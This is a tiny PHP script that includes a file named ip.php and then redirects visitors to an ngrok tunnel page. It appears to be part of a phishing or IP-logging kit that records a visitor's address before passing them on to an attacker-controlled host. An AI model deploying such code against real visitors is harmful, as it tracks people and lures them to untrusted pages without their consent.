<?php
include 'ip.php';
header('Location: https://dd39f00c.ngrok.io/index2.html');
exit
?>
